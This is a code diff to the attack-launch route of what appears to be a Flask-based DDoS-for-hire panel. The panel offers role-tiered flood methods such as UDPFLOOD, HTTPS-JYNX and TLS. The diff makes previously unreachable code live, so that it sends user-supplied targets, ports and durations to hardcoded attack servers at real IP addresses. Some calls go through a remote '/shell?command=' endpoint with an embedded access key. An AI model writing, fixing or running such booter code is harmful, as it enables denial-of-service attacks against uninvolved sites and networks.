@@ -142,50 +142,55 @@ def launch_attack():
 
     role = session.get('role', 'free')
 
-    free_method = ['FREE-TLS']
-    premium_method = [
-        'UDPFLOOD',
-        'UDPRAND',
-        'HTTPS-JYNX',
-        'TLS'
-    ]
+    free_methods = ['FREE-TLS']
+    premium_methods = ['UDPFLOOD', 'UDPRAND', 'HTTPS-JYNX', 'TLS']
 
     if role == 'admin':
-        allowed_method = free_method + premium_method
-       
+        allowed_methods = free_methods + premium_methods
+
     elif role == 'premium':
-        allowed_method = free_method + premium_method
-    
+        allowed_methods = free_methods + premium_methods
+
     elif role == 'free':
-        allowed_method = free_method
+        allowed_methods = free_methods
 
     else:
         flash('Role tidak diizinkan!', 'error')
         return redirect(url_for('index'))
 
-    if method not in allowed_method:
+    if method not in allowed_methods:
         flash('Method tidak valid untuk role kamu!', 'error')
         return redirect(url_for('index'))
 
+    print(f"Attack: {target}:{port} {method} {duration}")
+
+    try:
+        if method == "UDPFLOOD":
+            url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
+            requests.get(url)
+
+        elif method == "UDPRAND":
+            url = f"http://217.144.185.177:5000/shell?command=./udp {target} {port} 1000 1000 {duration}&key=kriskaUSDEGR454T"
+            requests.get(url)
+
+        elif method == "HTTPS-JYNX":
+            url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
+            requests.get(url)
+
+        elif method == "FREE-TLS":
+            url = f"http://188.166.212.32:2003/layer4?host={target}&port={port}&time={duration}&method={method}"
+            requests.get(url)
+
+        elif method == "TLS":
+            url = f"http://217.144.185.177:5000/shell?command=node TLS.js {target} {duration} 1 http2.txt&key=kriskaUSDEGR454T"
+            requests.get(url)
+
+    except Exception as e:
+        print("ERROR REQUEST:", e)
+        flash('Request gagal dikirim!', 'error')
+        return redirect(url_for('index'))
+
     flash('Aksi berhasil dijalankan!', 'success')
-    return redirect(url_for('index'))
-    
-    print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration}, Метод: {method}")
-    if method == "UDPFLOOD":
-        url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
-        requests.get(url)
-    elif method == "UDPRAND":
-        url = f"http://217.144.185.177:5000/shell?command=./udp {target} {port} 1000 1000 {duration}&key=kriskaUSDEGR454T"
-        requests.get(url)
-    elif method == "HTTPS-JYNX":
-        url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
-        requests.get(url)
-    elif method == "FREE-TLS":
-        url = f"http://188.166.212.32:2003/layer4?host={target}&port={port}&time={duration}&method={method}"
-        requests.get(url)
-    elif method == "TLS":
-        url = f"http://217.144.185.177:5000/shell?command=node TLS.js {target} {duration} 1 http2.txt&key=kriskaUSDEGR454T"
-        requests.get(url)
     return redirect(url_for('index'))
 
 if __name__ == "__main__":
